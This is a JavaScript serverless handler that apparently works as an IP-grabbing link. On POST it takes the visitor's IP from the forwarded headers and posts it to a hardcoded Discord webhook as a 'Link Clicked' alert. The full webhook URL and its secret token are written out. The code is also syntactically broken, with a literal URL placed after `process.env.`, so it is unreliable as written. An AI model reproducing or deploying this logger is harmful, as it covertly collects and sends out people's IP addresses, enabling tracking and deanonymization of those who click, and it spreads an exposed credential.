export default async function handler(req, res) {
    const ip =
        req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
        req.headers["x-real-ip"] ||
        "Unknown";

    if (req.method === "POST") {
        try {
            await fetch(process.env.https://discord.com/api/webhooks/1540377524608176168/uvk7X7sn8IOJivqHPhhq2WD7ALpoEz7-I1_U8pQ_mYRnuKdI6J8Lgd8RzoVkfjXTJsdqL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "🔗 Link Clicked",
                        fields: [
                            {
                                name: "IP Address",
                                value: `\`${ip}\``,
                            }
                        ],
                        timestamp: new Date().toISOString(),
                    }],
                }),
            });

            return res.status(200).json({ success: true });
        } catch (error) {
            return res.status(500).json({ error: "Failed" });
        }
    }

    return res.status(405).json({ error: "Method not allowed" });
}
